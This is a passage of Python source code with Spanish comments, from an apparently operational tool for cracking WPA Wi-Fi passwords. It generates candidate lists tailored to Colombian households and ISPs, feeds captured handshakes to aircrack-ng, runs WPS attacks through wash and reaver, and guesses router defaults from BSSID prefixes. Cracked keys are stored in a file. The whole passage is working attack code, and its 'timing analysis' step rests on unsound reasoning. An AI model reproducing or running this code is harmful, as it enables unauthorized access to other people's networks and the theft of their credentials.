                for prefix in common_prefixes:
                    combinations = [
                        essid_var + suffix,
                        prefix + essid_var,
                        prefix + essid_var + suffix,
                        essid_var + suffix + '123',
                        essid_var.capitalize() + suffix
                    ]
                    
                    for combo in combinations:
                        if 8 <= len(combo) <= 63:
                            passwords.add(combo)
        
        # Patrones de teclado extendidos
        keyboard_patterns = [
            'qwertyui', 'asdfghjk', 'zxcvbnm', 'qwerty123', 'qwerty1234',
            'password', 'password123', 'admin123', 'administrator',
            '12345678', '87654321', '11111111', '22222222', '00000000',
            'qazwsxed', 'plokijuh', 'mnbvcxza', '1qaz2wsx', '1q2w3e4r'
        ]
        
        passwords.update(kb for kb in keyboard_patterns if len(kb) >= 8)
        
        # Mutaciones de BSSID
        bssid_numbers = ''.join(c for c in bssid if c.isdigit())
        if len(bssid_numbers) >= 4:
            for essid_var in essid_variations[:2]:
                for i in range(len(bssid_numbers) - 3):
                    segment = bssid_numbers[i:i+4]
                    combinations = [
                        essid_var + segment,
                        segment + essid_var,
                        essid_var + segment + '123'
                    ]
                    for combo in combinations:
                        if 8 <= len(combo) <= 63:
                            passwords.add(combo)
        
        # Convertir a lista y ordenar por probabilidad
        password_list = list(passwords)
        
        # Ordenar por longitud (las de ~10 caracteres son más comunes)
        password_list.sort(key=lambda x: abs(len(x) - 10))
        
        # Limitar a 25,000 contraseñas para ser eficiente
        return password_list[:25000]
    
    def test_password_batch_with_analysis(self, target, handshake_file, password_batch, batch_name, timeout=300):
        """Probar lote de contraseñas con análisis de respuesta"""
        if not password_batch:
            return None
        
        # Crear archivo temporal del lote
        temp_file = f"/tmp/batch_{batch_name}_{int(time.time())}.txt"
        
        try:
            with open(temp_file, 'w') as f:
                for pwd in password_batch:
                    if isinstance(pwd, str) and len(pwd) >= 8:
                        f.write(pwd + '\n')
            
            # Medir tiempo de respuesta
            start_time = time.time()
            
            # Ejecutar aircrack-ng con análisis detallado
            crack_cmd = f"aircrack-ng {handshake_file} -w {temp_file}"
            success, output, error = self.run_command(crack_cmd, timeout=timeout)
            
            end_time = time.time()
            response_time = end_time - start_time
            
            # Analizar respuesta
            self.analyze_aircrack_response(output, error, password_batch, response_time)
            
            if success and "KEY FOUND" in output:
                # Extraer contraseña exitosa
                import re
                key_pattern = r'KEY FOUND! \[\s*(.+?)\s*\]'
                match = re.search(key_pattern, output)
                if match:
                    password = match.group(1).strip()
                    self.log(f"CONTRASENA ENCONTRADA con {batch_name}! -> {password}", "SUCCESS")
                    
                    # Analizar patrones exitosos
                    self.analyze_successful_password(password, target)
                    return password
        
        except Exception as e:
            self.log(f"Error probando lote {batch_name}: {e}", "WARNING")
        finally:
            # Limpiar archivo temporal
            try:
                os.remove(temp_file)
            except:
                pass
        
        return None
    
    def analyze_aircrack_response(self, output, error, passwords, response_time):
        """Analizar respuesta de aircrack-ng para aprender patrones"""
        analysis = {
            'batch_size': len(passwords),
            'response_time': response_time,
            'output_length': len(output) if output else 0,
            'error_present': bool(error and error.strip()),
            'timestamp': time.time()
        }
        
        # Detectar patrones en la salida
        if output:
            # Analizar si hay indicios de proximidad a la contraseña correcta
            if 'Tested' in output:
                # Extraer número de contraseñas probadas
                import re
                tested_match = re.search(r'Tested (\d+) passphrase', output)
                if tested_match:
                    analysis['passwords_tested'] = int(tested_match.group(1))
            
            # Medir tiempo por contraseña
            if len(passwords) > 0:
                time_per_password = response_time / len(passwords)
                analysis['time_per_password'] = time_per_password
                self.crack_stats['time_per_attempt'].append(time_per_password)
        
        self.crack_stats['response_analysis'].append(analysis)
        
        # Adaptación basada en tiempo de respuesta
        if response_time > 60:  # Si toma mucho tiempo
            self.log("Respuesta lenta detectada - adaptando tamaño de lotes", "WARNING")
    
    def analyze_successful_password(self, password, target):
        """Analizar contraseña exitosa para mejorar algoritmos futuros"""
        self.log(f"Analizando patron exitoso: {password}", "INFO")
        
        # Extraer patrones de la contraseña exitosa
        patterns = {
            'length': len(password),
            'has_numbers': any(c.isdigit() for c in password),
            'has_letters': any(c.isalpha() for c in password),
            'has_symbols': any(not c.isalnum() for c in password),
            'starts_with_essid': password.lower().startswith(target['essid'].lower()),
            'ends_with_numbers': password[-1].isdigit() if password else False,
            'contains_year': any(str(year) in password for year in range(2000, 2025))
        }
        
        # Guardar patrones para futuras auditorías
        success_file = "/tmp/successful_patterns.txt"
        try:
            with open(success_file, 'a') as f:
                f.write(f"{password}|{target['essid']}|{patterns}\n")
        except:
            pass
        
        self.log(f"Patron exitoso guardado: {patterns}", "SUCCESS")
    
    def adaptive_learning_attack(self, target, handshake_file):
        """Ataque adaptativo que aprende de las respuestas fallidas"""
        self.log("Iniciando ataque adaptativo con aprendizaje...", "INFO")
        
        # Cargar patrones exitosos previos
        learned_patterns = self.load_learned_patterns()
        
        # Generar contraseñas basadas en aprendizaje previo
        adaptive_passwords = self.generate_adaptive_passwords(target, learned_patterns)
        
        if not adaptive_passwords:
            self.log("No se generaron contraseñas adaptativas", "WARNING")
            return None
        
        self.log(f"Generadas {len(adaptive_passwords)} contraseñas adaptativas", "INFO")
        
        # Probar en lotes con análisis de patrones
        for i in range(0, len(adaptive_passwords), 500):
            if not self.running:
                break
                
            batch = adaptive_passwords[i:i+500]
            password = self.test_adaptive_batch(target, handshake_file, batch, i//500 + 1)
            if password:
                return password
        
        return None
    
    def network_response_analysis_attack(self, target, handshake_file):
        """Analizar respuestas de red para inferir características de la contraseña"""
        self.log("Analizando respuestas de red para timing attacks...", "INFO")
        
        # Generar contraseñas de prueba para análisis
        test_passwords = self.generate_timing_test_passwords(target)
        
        timing_data = []
        
        # Probar diferentes longitudes para detectar patrones
        for length in [8, 9, 10, 11, 12]:
            length_passwords = [p for p in test_passwords if len(p) == length][:50]
            if length_passwords:
                avg_time = self.measure_response_time(handshake_file, length_passwords)
                timing_data.append({
                    'length': length,
                    'avg_time': avg_time,
                    'sample_size': len(length_passwords)
                })
                self.log(f"Longitud {length}: {avg_time:.3f}s promedio", "INFO")
        
        # Analizar patrones de timing
        optimal_length = self.analyze_timing_patterns(timing_data)
        if optimal_length:
            self.log(f"Longitud óptima detectada: {optimal_length} caracteres", "SUCCESS")
            
            # Generar contraseñas enfocadas en la longitud óptima
            focused_passwords = self.generate_length_focused_passwords(target, optimal_length)
            
            # Probar contraseñas enfocadas
            password = self.test_password_batch_with_analysis(
                target, handshake_file, focused_passwords[:2000], "timing_focused"
            )
            if password:
                return password
        
        return None
    
    def evolutionary_password_attack(self, target, handshake_file):
        """Algoritmo evolutivo que muta contraseñas incorrectas"""
        self.log("Iniciando algoritmo evolutivo de contraseñas...", "INFO")
        
        # Población inicial
        population = self.generate_initial_population(target, size=100)
        generation = 0
        max_generations = 10
        
        # Inicializar barra de progreso
        progress_bar = ProgressBar(
            total=max_generations,
            prefix="FASE 5 [Evolutivo]",
            suffix=f"0/{max_generations} generaciones | Población: {len(population)}",
            length=30
        )
        
        while generation < max_generations and self.running:
            generation += 1
            
            # Actualizar barra de progreso
            progress_bar.update(
                generation, 
                f"{generation}/{max_generations} generaciones | Población: {len(population)}"
            )
            
            # Evaluar población actual
            fitness_scores = self.evaluate_population_fitness(population, target)
            
            # Probar mejores candidatos
            best_candidates = [p for p, f in sorted(zip(population, fitness_scores), key=lambda x: x[1], reverse=True)[:50]]
            
            password = self.test_password_batch_with_analysis(
                target, handshake_file, best_candidates, f"evolutionary_gen_{generation}"
            )
            if password:
                progress_bar.finish(f"CONTRASEÑA ENCONTRADA: {password}")
                return password
            
            # Evolucionar población
            population = self.evolve_population(population, fitness_scores, target)
        
        progress_bar.finish(f"Evolución completada - {max_generations} generaciones")
        return None
    
    def parallel_massive_attack(self, target, handshake_file):
        """Ataque paralelo masivo como último recurso - Máximo 5 minutos"""
        self.log("Iniciando ataque paralelo masivo final (Máximo 5 minutos)...", "INFO")
        
        # Control de tiempo - Máximo 5 minutos
        start_time = time.time()
        max_duration = 300  # 5 minutos en segundos
        
        # Generar wordlists más pequeñas y eficientes
        wordlists = {
            'numeric_heavy': self.generate_numeric_heavy_wordlist(target)[:1000],  # Máximo 1000
            'alpha_heavy': self.generate_alpha_heavy_wordlist(target)[:800],     # Máximo 800
            'mixed_patterns': self.generate_mixed_pattern_wordlist(target)[:1200], # Máximo 1200
            'regional_specific': self.generate_regional_wordlist(target)[:1500], # Máximo 1500
            'keyboard_patterns': self.generate_keyboard_wordlist(target)[:200]   # Máximo 200
        }
        
        # Calcular total de lotes (lotes más pequeños para mejor progreso)
        batch_size = 500  # Lotes más pequeños
        total_batches = 0
        for wordlist in wordlists.values():
            total_batches += (len(wordlist) + batch_size - 1) // batch_size
        
        self.log(f"Total de contraseñas: {sum(len(wl) for wl in wordlists.values())}, Lotes: {total_batches}", "INFO")
        
        # Inicializar barra de progreso
        progress_bar = ProgressBar(
            total=total_batches,
            prefix="FASE 6 [Paralelo Masivo]",
            suffix=f"0/{total_batches} lotes | Timeout: 5min",
            length=40
        )
        
        batch_count = 0
        
        # Ejecutar con control de tiempo
        for name, wordlist in wordlists.items():
            if not self.running:
                progress_bar.finish("Interrumpido por usuario")
                break
                
            # Verificar timeout global
            elapsed = time.time() - start_time
            if elapsed >= max_duration:
                progress_bar.finish(f"Timeout alcanzado ({elapsed:.0f}s) - Fase completada")
                self.log(f"FASE 6: Timeout de 5 minutos alcanzado - finalizando", "WARNING")
                break
            
            # Dividir en lotes pequeños
            for i in range(0, len(wordlist), batch_size):
                batch_count += 1
                batch = wordlist[i:i+batch_size]
                
                # Verificar timeout antes de cada lote
                elapsed = time.time() - start_time
                remaining_time = max_duration - elapsed
                
                if remaining_time <= 0:
                    progress_bar.finish(f"Timeout alcanzado - {batch_count-1} lotes completados")
                    self.log(f"FASE 6: Timeout de 5 minutos alcanzado", "WARNING")
                    return None
                
                # Actualizar barra de progreso
                progress_bar.update(
                    batch_count, 
                    f"{batch_count}/{total_batches} | {name} ({len(batch)}) | {remaining_time:.0f}s restantes"
                )
                
                # Probar lote con timeout reducido
                password = self.test_password_batch_with_analysis(
                    target, handshake_file, batch, f"{name}_{i//batch_size + 1}", timeout=30
                )
                if password:
                    progress_bar.finish(f"CONTRASEÑA ENCONTRADA: {password}")
                    return password
        
        total_elapsed = time.time() - start_time
        progress_bar.finish(f"Completado en {total_elapsed:.0f}s - {batch_count} lotes probados")
        return None
    
    def load_learned_patterns(self):
        """Cargar patrones aprendidos de sesiones anteriores"""
        patterns = {
            'successful_lengths': [10, 11, 12, 9, 8],  # Longitudes más comunes primero
            'common_suffixes': ['123', '1234', '12345', '2024', '2023'],
            'common_prefixes': ['mi', 'casa', 'red'],
            'successful_patterns': []
        }
        
        try:
            success_file = "/tmp/successful_patterns.txt"
            if os.path.exists(success_file):
                with open(success_file, 'r') as f:
                    for line in f:
                        if '|' in line:
                            password, essid, pattern_str = line.strip().split('|', 2)
                            patterns['successful_patterns'].append({
                                'password': password,
                                'essid': essid,
                                'pattern': pattern_str
                            })
        except:
            pass
        
        return patterns
    
    def generate_adaptive_passwords(self, target, learned_patterns):
        """Generar contraseñas basadas en aprendizaje previo"""
        adaptive_passwords = set()
        essid = target['essid']
        
        # Aplicar patrones exitosos previos
        for pattern_data in learned_patterns.get('successful_patterns', []):
            # Adaptar patrón exitoso al ESSID actual
            old_essid = pattern_data['essid']
            old_password = pattern_data['password']
            
            if old_essid.lower() in old_password.lower():
                # Reemplazar ESSID anterior con el actual
                adapted = old_password.lower().replace(old_essid.lower(), essid.lower())
                if 8 <= len(adapted) <= 63:
                    adaptive_passwords.add(adapted)
                    
                # Variaciones
                adaptive_passwords.add(adapted.capitalize())
                adaptive_passwords.add(essid + old_password[len(old_essid):])
        
        # Aplicar longitudes exitosas
        for length in learned_patterns.get('successful_lengths', []):
            if length <= len(essid) + 6:
                continue
                
            base = essid[:length-4] if len(essid) > length-4 else essid
            for suffix in learned_patterns.get('common_suffixes', []):
                candidate = base + suffix
                if len(candidate) == length:
                    adaptive_passwords.add(candidate)
        
        return list(adaptive_passwords)[:1000]  # Limitar a 1000
    
    def generate_timing_test_passwords(self, target):
        """Generar contraseñas para pruebas de timing"""
        essid = target['essid']
        passwords = []
        
        # Diferentes longitudes con el mismo patrón
        for length in range(8, 16):
            base = essid[:min(len(essid), length-3)]
            padding = '1' * (length - len(base))
            passwords.append(base + padding)
        
        return passwords
    
    def measure_response_time(self, handshake_file, passwords):
        """Medir tiempo promedio de respuesta para un lote de contraseñas"""
        if not passwords:
            return 0
        
        temp_file = f"/tmp/timing_test_{int(time.time())}.txt"
        try:
            with open(temp_file, 'w') as f:
                for pwd in passwords:
                    f.write(pwd + '\n')
            
            start_time = time.time()
            self.run_command(f"aircrack-ng {handshake_file} -w {temp_file}", timeout=30)
            end_time = time.time()
            
            return (end_time - start_time) / len(passwords)
        except:
            return 0
        finally:
            try:
                os.remove(temp_file)
            except:
                pass
    
    def analyze_timing_patterns(self, timing_data):
        """Analizar patrones de timing para detectar longitud óptima"""
        if not timing_data:
            return None
        
        # Buscar la longitud con menor tiempo (puede indicar proximidad)
        min_time_entry = min(timing_data, key=lambda x: x['avg_time'])
        return min_time_entry['length']
    
    def generate_length_focused_passwords(self, target, optimal_length):
        """Generar contraseñas enfocadas en longitud específica"""
        essid = target['essid']
        passwords = set()
        
        # Rellenar/recortar ESSID a la longitud objetivo
        if len(essid) > optimal_length - 2:
            base = essid[:optimal_length - 2]
        else:
            base = essid
        
        # Generar variaciones de la longitud exacta
        padding_chars = '0123456789'
        for pad_char in padding_chars:
            needed = optimal_length - len(base)
            if needed > 0:
                passwords.add(base + pad_char * needed)
        
        return list(passwords)
    
    def generate_initial_population(self, target, size=100):
        """Generar población inicial para algoritmo evolutivo"""
        essid = target['essid']
        population = []
        
        # Base: variaciones del ESSID
        bases = [essid, essid.lower(), essid.upper(), essid.capitalize()]
        
        for i in range(size):
            base = bases[i % len(bases)]
            # Añadir sufijo aleatorio
            import random
            suffixes = ['123', '1234', '12345', '2024', '2023', '456', '789']
            suffix = random.choice(suffixes)
            
            candidate = base + suffix
            if len(candidate) >= 8:
                population.append(candidate)
        
        return population[:size]
    
    def evaluate_population_fitness(self, population, target):
        """Evaluar fitness de la población basado en similitud al objetivo"""
        essid = target['essid'].lower()
        fitness_scores = []
        
        for password in population:
            score = 0
            pwd_lower = password.lower()
            
            # Puntos por contener el ESSID
            if essid in pwd_lower:
                score += 50
            
            # Puntos por longitud óptima
            if 9 <= len(password) <= 12:
                score += 30
            
            # Puntos por patrones comunes
            if any(suffix in password for suffix in ['123', '2024', '2023']):
                score += 20
            
            # Penalización por caracteres especiales (menos comunes)
            if any(c in password for c in '!@#$%^&*()_+-=[]{}|;:,.<>?'):
                score -= 10
            
            fitness_scores.append(score)
        
        return fitness_scores
    
    def evolve_population(self, population, fitness_scores, target):
        """Evolucionar población mediante mutación y cruce"""
        essid = target['essid']
        new_population = []
        
        # Seleccionar mejores individuos (50%)
        best_indices = sorted(range(len(fitness_scores)), key=lambda i: fitness_scores[i], reverse=True)
        elite = [population[i] for i in best_indices[:len(population)//2]]
        new_population.extend(elite)
        
        # Generar nuevos individuos por mutación
        import random
        while len(new_population) < len(population):
            parent = random.choice(elite)
            mutated = self.mutate_password(parent, essid)
            if mutated and len(mutated) >= 8:
                new_population.append(mutated)
        
        return new_population[:len(population)]
    
    def mutate_password(self, password, essid):
        """Mutar una contraseña para crear variación"""
        import random
        mutations = [
            lambda p: p + random.choice(['1', '2', '3', '4', '5']),  # Añadir dígito
            lambda p: p[:-1] + random.choice(['123', '456', '789']) if len(p) > 8 else p + '123',  # Cambiar final
            lambda p: p.upper() if p.islower() else p.lower(),  # Cambiar caso
            lambda p: essid.lower() + p[len(essid):] if p.startswith(essid) else essid.lower() + p[-3:],  # Prefijo ESSID
            lambda p: p + random.choice(['2024', '2023', '2025'])  # Añadir año
        ]
        
        mutation = random.choice(mutations)
        try:
            return mutation(password)
        except:
            return password + '123'
    
    def generate_numeric_heavy_wordlist(self, target):
        """Generar wordlist con énfasis en números - optimizada"""
        passwords = set()
        essid = target['essid']
        
        # Patrones numéricos más focalizados
        # Años comunes
        for year in range(1980, 2025):
            passwords.add(str(year) * 2)  # 19951995
            passwords.add(f"{year}{year % 100:02d}")  # 199595
        
        # Números de teléfono colombianos comunes
        phone_prefixes = ['300', '301', '310', '311', '320']
        for prefix in phone_prefixes:
            for i in range(1000000, 1010000, 1000):  # Cada 1000 números
                phone = f"{prefix}{str(i)[1:]}"
                if len(phone) >= 8:
                    passwords.add(phone)
        
        # Patrones numéricos simples
        simple_numbers = [
            '12345678', '87654321', '11111111', '22222222', '00000000',
            '12344321', '98765432', '11223344', '88888888', '99999999'
        ]
        passwords.update(simple_numbers)
        
        return list(passwords)[:1000]  # Máximo 1000
    
    def generate_alpha_heavy_wordlist(self, target):
        """Generar wordlist con énfasis en letras - optimizada"""
        passwords = set()
        essid = target['essid']
        
        # Palabras comunes en español
        common_words = [
            'password', 'internet', 'network', 'wireless', 'connection',
            'familia', 'casa', 'hogar', 'oficina', 'trabajo',
            'colombia', 'bogota', 'medellin', 'cali', 'america',
            'personal', 'privado', 'seguro', 'acceso', 'usuario'
        ]
        
        # Generar combinaciones con el ESSID
        for word in common_words:
            if len(word) >= 8:
                passwords.add(word)
            
            # Combinaciones con ESSID
            for combo in [f"{word}{essid.lower()}", f"{essid.lower()}{word}"]:
                if 8 <= len(combo) <= 63:
                    passwords.add(combo)
                    passwords.add(combo.capitalize())
        
        # Secuencias alfabéticas comunes
        sequences = [
            'abcdefgh', 'qwertyui', 'asdfghjk', 'zxcvbnma',
            'alphabet', 'keyboard', 'sequence', 'standard'
        ]
        passwords.update(seq for seq in sequences if len(seq) >= 8)
        
        return list(passwords)[:800]  # Máximo 800
    
    def generate_mixed_pattern_wordlist(self, target):
        """Generar patrones mixtos alfanuméricos"""
        passwords = set()
        essid = target['essid']
        
        # Patrones mixtos comunes
        patterns = [
            f"{essid}123", f"{essid}1234", f"{essid}12345",
            f"123{essid}", f"1234{essid}", f"12345{essid}",
            f"{essid}2024", f"2024{essid}", f"{essid}2023"
        ]
        
        for pattern in patterns:
            if len(pattern) >= 8:
                passwords.add(pattern)
                passwords.add(pattern.upper())
                passwords.add(pattern.lower())
                passwords.add(pattern.capitalize())
        
        return list(passwords)
    
    def generate_regional_wordlist(self, target):
        """Generar wordlist con patrones regionales colombianos"""
        passwords = set()
        essid = target['essid']
        
        colombian_words = [
            'colombia', 'bogota', 'medellin', 'cali', 'barranquilla',
            'claro', 'movistar', 'tigo', 'une', 'etb', 'virgin',
            'familia', 'casa', 'hogar', 'internet', 'wifi'
        ]
        
        for word in colombian_words:
            for suffix in ['123', '1234', '2024', '2023']:
                passwords.add(word + suffix)
                passwords.add(essid + word + suffix)
                passwords.add(word + essid + suffix)
        
        return list(passwords)
    
    def generate_keyboard_wordlist(self, target):
        """Generar patrones de teclado"""
        patterns = [
            'qwertyui', 'asdfghjk', 'zxcvbnma',
            '12345678', '87654321', 'qwerty123',
            'password', 'password123', 'admin123'
        ]
        
        return [p for p in patterns if len(p) >= 8]
    
    def test_adaptive_batch(self, target, handshake_file, batch, batch_num):
        """Probar lote adaptativo con métricas adicionales"""
        self.log(f"Probando lote adaptativo {batch_num} ({len(batch)} contraseñas)...", "INFO")
        return self.test_password_batch_with_analysis(target, handshake_file, batch, f"adaptive_{batch_num}")
    
    def intelligent_analysis(self, target):
        """Análisis inteligente para obtener información sin wordlists"""
        essid = target['essid']
        bssid = target['bssid']
        
        # 1. Verificar si WPS está habilitado (más fácil)
        password = self.try_wps_attack(target)
        if password:
            return password
        
        # 2. Análisis del fabricante por BSSID
        password = self.analyze_router_defaults(target)
        if password:
            return password
        
        # 3. Análisis de patrones comunes por ESSID
        password = self.analyze_essid_patterns(target)
        if password:
            return password
        
        # 4. Búsqueda en bases de datos de contraseñas por defecto
        password = self.check_default_passwords(target)
        if password:
            return password
        
        self.log("🤖 Análisis inteligente completado - sin resultados", "WARNING")
        return None
    
    def try_wps_attack(self, target):
        """Intentar ataque WPS si está disponible"""
        bssid = target['bssid']
        
        self.log("📡 Verificando si WPS está habilitado...", "INFO")
        
        # Verificar WPS con wash
        wash_cmd = f"timeout 10 wash -i {self.monitor_interface} | grep {bssid}"
        success, output, _ = self.run_command(wash_cmd)
        
        if success and bssid in output and "Yes" in output:
            self.log("🎯 ¡WPS detectado! Intentando ataque...", "SUCCESS")
            
            # Intentar reaver (más rápido que bully)
            reaver_cmd = f"timeout 60 reaver -i {self.monitor_interface} -b {bssid} -vv -S"
            success, output, _ = self.run_command(reaver_cmd)
            
            if success and "WPA PSK" in output:
                # Extraer contraseña WPS
                for line in output.split('\n'):
                    if "WPA PSK" in line:
                        password = line.split("'")[1] if "'" in line else line.split()[-1]
                        self.log(f"🎉 ¡CONTRASEÑA WPS ENCONTRADA! → {password}", "SUCCESS")
                        return password
        
        return None
    
    def analyze_router_defaults(self, target):
        """Analizar contraseñas por defecto según el fabricante"""
        bssid = target['bssid']
        essid = target['essid']
        
        self.log(f"🔍 Analizando fabricante por BSSID: {bssid}", "INFO")
        
        # Base de datos de OUI (primeros 3 octetos) y sus contraseñas típicas
        oui_database = {
            # Movistar/Telefonica
            '00:1F:A4': ['movistar', essid, essid[-8:] if len(essid) >= 8 else essid + '1234'],
            '00:1B:20': ['movistar', essid, essid + '2024'],
            
            # Claro
            '00:25:68': ['claro123', essid, 'admin123'],
            '00:1E:2A': ['claro123', essid + '123'],
            
            # ETB (Colombia)
            '24:2F:D0': ['etb12345', essid, essid + 'etb'],
            '50:1B:32': ['etb12345', essid + '123'],
            
            # TP-Link
            '18:D6:C7': ['admin123', essid, essid + '123'],
            '50:C7:BF': ['admin', 'tplink123'],
            
            # D-Link
            '00:26:5A': ['admin', essid, 'dlink123'],
            '00:1B:11': ['admin', essid + '123'],
            
            # Linksys
            '00:25:9C': ['admin', essid, 'linksys123'],
            '68:7F:74': ['admin', essid + '123'],
            
            # Huawei
            '00:25:9E': ['admin', essid, essid[-8:] if len(essid) >= 8 else 'huawei123'],
            
            # Netgear
            '00:26:F2': ['password', essid, 'netgear123'],
            '84:1B:5E': ['password', essid + '123'],
        }
        
        # Extraer OUI (primeros 6 caracteres)
        oui = bssid[:8].upper()
        
        if oui in oui_database:
            self.log(f"📋 Fabricante detectado para OUI {oui}", "SUCCESS")
            passwords_to_try = oui_database[oui]
            
            return self.quick_password_test(target, passwords_to_try, "fabricante")
        
        return None
    
    def analyze_essid_patterns(self, target):
        """Análisis de patrones comunes en nombres de red"""
        essid = target['essid'].lower()
        
        self.log(f"🔤 Analizando patrones en ESSID: {essid}", "INFO")
        
        patterns = []
        
        # Patrones familiares colombianos
        if any(word in essid for word in ['familia', 'flia', 'casa', 'hogar']):
            patterns.extend([
                essid.replace(' ', '') + '123',
                essid.replace(' ', '') + '2024',
                'familia123', 'casa1234'
            ])
        
        # Patrones de operadores
        if 'claro' in essid:
            patterns.extend(['claro123', essid + '123', 'admin123'])
        if 'movistar' in essid:
            patterns.extend(['movistar', essid, essid[-8:] if len(essid) >= 8 else essid + '123'])
        if 'etb' in essid:
            patterns.extend(['etb12345', essid.replace('_etb', ''), 'fibra123'])
        
        # Patrones de nombres personales
        if any(char.isalpha() for char in essid) and len(essid) <= 15:
            # Probablemente un nombre
            patterns.extend([
                essid + '123', essid + '1234', essid + '12345',
                essid + '2024', essid + '01', '123' + essid
            ])
        
        if patterns:
            return self.quick_password_test(target, patterns, "patrones ESSID")
        
        return None
    
    def check_default_passwords(self, target):
        """Verificar contraseñas por defecto ultra comunes"""
        self.log("🔑 Probando contraseñas por defecto comunes...", "INFO")
        
        # Lista de contraseñas por defecto más comunes en Colombia
        default_passwords = [
            '12345678', '123456789', 'admin123', 'password',
            'movistar', 'claro123', 'etb12345', 'telmex123',
            'familia123', 'casa1234', 'internet', 'wifi1234',
            '87654321', '11111111', '00000000', 'qwerty123',
            'administrador', 'password123', 'admin1234'
        ]
        
        return self.quick_password_test(target, default_passwords, "contraseñas por defecto")
    
    def quick_password_test(self, target, passwords, method_name):
        """Probar rápidamente una lista pequeña de contraseñas"""
        self.log(f"⚡ Probando {len(passwords)} contraseñas de {method_name}...", "INFO")
        
        # Crear wordlist temporal
        temp_wordlist = f"/tmp/quick_{method_name.replace(' ', '_')}.txt"
        try:
            with open(temp_wordlist, 'w') as f:
                for pwd in passwords:
                    if pwd and len(pwd) >= 8:  # Solo contraseñas válidas WPA
                        f.write(pwd + '\n')
        except:
            return None
        
        # Probar con aircrack-ng (timeout corto)
        crack_cmd = f"aircrack-ng -w {temp_wordlist} -b {target['bssid']} handshakes/{target['essid']}_{target['bssid'].replace(':', '')}-01.cap"
        success, output, _ = self.run_command(crack_cmd, timeout=30)
        
        if success and "KEY FOUND" in output:
            key_pattern = r'KEY FOUND! \[\s*(.+?)\s*\]'
            match = re.search(key_pattern, output)
            if match:
                password = match.group(1).strip()
                self.log(f"🎉 ¡CONTRASEÑA ENCONTRADA POR {method_name.upper()}! → {password}", "SUCCESS")
                return password
        
        # Limpiar archivo temporal
        try:
            os.remove(temp_wordlist)
        except:
            pass
        
        return None
    
    def wordlist_attack(self, target, handshake_file):
        """Método tradicional con wordlists (fallback)"""
        self.log("📚 Iniciando ataque tradicional con wordlists...", "INFO")
        
        # Crear wordlist personalizada mejorada
        custom_wordlist = self.create_simple_wordlist(target)
        
        # Lista de wordlists por orden de efectividad
        wordlists_to_try = [custom_wordlist]
        
        # Agregar wordlists del sistema si existen
        system_wordlists = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/fasttrack.txt",
            str(self.wordlist_dir / "common_passwords.txt")
        ]
        
        for wl in system_wordlists:
            if os.path.exists(wl):
                wordlists_to_try.append(wl)
        
        # Probar cada wordlist
        for wl_path in wordlists_to_try:
            if not os.path.exists(wl_path):
                continue
            
            wl_name = os.path.basename(wl_path)
            self.log(f"🔍 Probando wordlist: {wl_name}", "INFO")
            
            # Comando aircrack-ng
            crack_cmd = f"aircrack-ng -w {wl_path} -b {target['bssid']} {handshake_file}"
            success, output, _ = self.run_command(crack_cmd, timeout=300)
            
            if success and "KEY FOUND" in output:
                # Extraer la contraseña
                key_pattern = r'KEY FOUND! \[\s*(.+?)\s*\]'
                match = re.search(key_pattern, output)
                if match:
                    password = match.group(1).strip()
                    self.log(f"🎉 ¡CONTRASEÑA ENCONTRADA CON WORDLIST! → {password}", "SUCCESS")
                    return password
            
            self.log(f"❌ Sin éxito con {wl_name}", "INFO")
        
        return None
    
    def create_simple_wordlist(self, target):
        """Crear wordlist personalizada simple y efectiva"""
        essid = target['essid']
        wordlist_file = f"/tmp/simple_{essid.replace(' ', '_')}.txt"
        passwords = set()
        
        # Limpiar ESSID
        essid_clean = essid.replace(' ', '').replace('-', '').replace('_', '')
        base_words = [essid, essid_clean, essid_clean.lower(), essid_clean.upper()]
        
        # Números comunes
        numbers = ['123', '1234', '12345', '123456', '12345678', '2024', '2023', '2022']
        
        # Sufijos comunes
        suffixes = ['', 'wifi', 'casa', 'home', 'admin']
        
        # Generar combinaciones
        for base in base_words:
            if len(base) < 2:
                continue
            for num in numbers:
                for suffix in suffixes:
                    combos = [base + num + suffix, base + suffix + num]
                    for combo in combos:
                        if len(combo) >= 8 and len(combo) <= 63:
                            passwords.add(combo)
        
        # Patrones comunes
        common = ['12345678', 'password', 'admin123', essid_clean + '123']
        passwords.update(p for p in common if len(p) >= 8)
        
        # Escribir archivo
        try:
            with open(wordlist_file, 'w') as f:
                for pwd in sorted(passwords, key=len):
                    f.write(pwd + '\n')
        except:
            pass
        
        return wordlist_file

    def advanced_bruteforce_attacks(self, target, handshake_file):
        """Ataques de fuerza bruta inteligente y dirigidos"""
        essid = target['essid']
        
        # 1. Ataque numérico puro (8-12 dígitos)
        self.log("🔢 Probando patrones numéricos comunes...", "INFO")
        numeric_patterns = [
            # Fechas de nacimiento comunes
            "19801980", "19901990", "20001980", "19951995",
            "19751975", "19851985", "20002000", "19701970",
            # Números de teléfono
            "30012345", "31012345", "32012345", "35012345",
            "60012345", "12345678", "87654321", "11111111",
            # Códigos postales comunes (Colombia)
            "11001234", "05001234", "76001234", "13001234",
            # Patrones simples
            "12344321", "12348765", "98765432", "13579246"
        ]
        
        password = self.quick_password_test_advanced(target, numeric_patterns, "numérico")
        if password:
            return password
        
        # 2. Generación numérica dinámica basada en ESSID
        if len(essid) >= 4:
            essid_numbers = []
            # Extraer números del ESSID
            import re
            numbers_in_essid = re.findall(r'\d+', essid)
            for num in numbers_in_essid:
                if len(num) >= 4:
                    essid_numbers.extend([
                        num * 2,  # Duplicar
                        num + num[::-1],  # Número + reverso
                        num + "1234", num + "2024"
                    ])
            
            if essid_numbers:
                password = self.quick_password_test_advanced(target, essid_numbers, "ESSID numérico")
                if password:
                    return password
        
        # 3. Fuerza bruta incremental (últimos 4 dígitos del año)
        self.log("📅 Probando variaciones con años recientes...", "INFO")
        year_patterns = []
        base_name = essid.replace(' ', '').replace('-', '')[:4]
        if len(base_name) >= 3:
            for year in range(2020, 2025):
                year_patterns.extend([
                    f"{base_name}{year}",
                    f"{year}{base_name}",
                    f"{base_name}{year}123"
                ])
        
        password = self.quick_password_test_advanced(target, year_patterns, "variaciones año")
        if password:
            return password
        
        return None
    
    def keyboard_pattern_attack(self, target, handshake_file):
        """Ataques basados en patrones de teclado comunes"""
        
        # Patrones de teclado QWERTY
        keyboard_patterns = [
            # Filas horizontales
            "qwertyui", "asdfghjk", "zxcvbnma", 
            "12345678", "87654321", "qwerty123",
            # Patrones diagonales
            "qazwsxed", "plokijuh", "mnbvcxza",
            # Patrones en L
            "qwerasdf", "yuiophjk", "123qweas",
            # Patrones comunes latinos
            "qwertyuiop", "asdfghjkl", "password123",
            "admin123", "usuario123", "internet123"
        ]
        
